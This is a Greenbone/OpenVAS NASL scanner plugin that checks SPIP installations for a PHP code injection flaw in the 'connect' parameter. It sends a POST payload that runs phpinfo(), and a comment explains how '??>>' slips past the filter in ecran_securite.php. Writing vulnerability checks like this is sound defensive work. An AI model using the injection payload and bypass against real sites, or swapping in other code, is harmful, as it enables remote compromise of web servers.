# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:spip:spip";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103777");
  script_version("2023-03-02T10:19:53+0000");
  script_tag(name:"last_modification", value:"2023-03-02 10:19:53 +0000 (Thu, 02 Mar 2023)");
  script_tag(name:"creation_date", value:"2013-08-29 12:05:48 +0200 (Thu, 29 Aug 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2013-4555", "CVE-2013-4556", "CVE-2013-4557");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("SPIP 'connect' Parameter PHP Code Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54292");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1029317");


  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_spip_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("spip/http/detected");

  script_tag(name:"summary", value:"SPIP is prone to a remote PHP code injection vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to execute the phpinfo() function by sending an HTTP POST request.");

  script_tag(name:"insight", value:"SPIP contains a flaw that is triggered when input passed via the 'connect'
  parameter is not properly sanitized before being used.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the affected application. This may facilitate a compromise of the application and the
  underlying system, other attacks are also possible.");

  script_tag(name:"affected", value:"SPIP versions prior to 2.0.21, 2.1.16, and 3.0.3 are vulnerable. Other
  versions may also affected.");

  script_tag(name:"solution", value:"Vendor updates are available.");




  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

for(i=0;i<2;i++) { # sometimes there is no output from phpinfo() on the first request. So try twice...

  data = "connect=??>><?php phpinfo();#"; # there is a typo in ecran_securite.php (line 260) which makes str_replace() looking for the string "?>". With "??>>" we could bypass this workaround. Some installations also need to comment out all behind the command...

  url = dir + "/spip.php";

  header = make_array("Content-Type", "application/x-www-form-urlencoded");
  req = http_post_put_req(port:port, url:url, data:data, add_headers:header);

  result = http_keepalive_send_recv(port:port, data:req);

  if("<title>phpinfo()</title>" >< result) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
